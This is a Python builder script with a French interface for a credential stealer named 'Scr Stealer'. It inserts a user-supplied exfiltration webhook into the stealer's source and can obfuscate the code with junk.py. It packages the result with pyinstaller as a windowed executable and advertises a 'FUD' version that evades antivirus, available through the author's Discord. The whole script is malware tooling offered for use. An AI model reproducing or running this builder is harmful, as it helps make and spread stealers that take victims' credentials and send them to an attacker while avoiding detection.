from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

  ██████  ▄████▄   ██▀███                                 
▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒                               
░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒                               
  ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄                                 
▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒                               
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░                               
░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░                               
░  ░  ░  ░          ░░   ░                                
      ░  ░ ░         ░                                    
         ░                                                
  ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓    ▓█████  ██▀███  
▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░    ▒███   ▓██ ░▄█ ▒
  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░    ▒▓█  ▄ ▒██▀▀█▄                By ! "ᎻꮖꭱꭺꮐꭺɴꭺᏚꮯꭱ#9898
▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░    ░     ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░         ░    ░   ▒     ░ ░      ░     ░░   ░ 
      ░              ░  ░     ░  ░    ░  ░   ░  ░   ░     

                > Appui(e) sur Entrer                                        

"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}

  ██████  ▄████▄   ██▀███                                 
▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒                               
░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒                               
  ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄                                 
▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒                               
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░                               
░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░                               
░  ░  ░  ░          ░░   ░                                
      ░  ░ ░         ░                                    
         ░                                                
  ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓    ▓█████  ██▀███  
▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░    ▒███   ▓██ ░▄█ ▒
  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░    ▒▓█  ▄ ▒██▀▀█▄                By ! "ᎻꮖꭱꭺꮐꭺɴꭺᏚꮯꭱ#9898
▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░    ░     ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░         ░    ░   ▒     ░ ░      ░     ░░   ░ 
      ░              ░  ░     ░  ░    ░  ░   ░  ░   ░     
                                                           

            Bienvenue dans le builder

""")

time.sleep(1)


while True:
    
    Write.Print("\nQuelle option voulez-vous choisir : ", Colors.red_to_yellow)
    Write.Print("\n1. Construire un fichier .exe", Colors.red_to_yellow)
    Write.Print("\n2. Construire FUD .exe (programmes antivirus non détectés)", Colors.red_to_yellow)
    Write.Print("\n3. Fermer", Colors.red_to_yellow)
    Write.Print("\nFaites votre sélection : ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nEntre ton webhook : " + Style.RESET_ALL)

        filename = "Scr Stealer.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"Intégration webhook a mettre ici :"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} fichier mis à jour.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nVoulez-vous jeter votre code ? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} Le fichier a été mis a la poubelle.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nVous avez une entré invalide. Veuillez réessayer.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nTu veux crée un fichier .exe ? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} Le fichier a étais converti en .exe ...", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nVous avez une entré invalide. Veuillez réessayer.", Colors.red_to_purple)

    elif choice == "2":
        Write.Print("\nNous pouvons partager le fud gratuitement pas maintenant. si vous voulez voici mon Discord: ! ""ᎻꮖꭱꭺꮐꭺɴꭺᏚꮯꭱ#9898", Colors.red_to_yellow)

    elif choice == "3":
        Write.Print("\nQuitter le programme...", Colors.red_to_yellow)
        break

    else:
        Write.Print("\nVous avez une entré invalide. Veuillez réessayer.", Colors.red_to_purple)
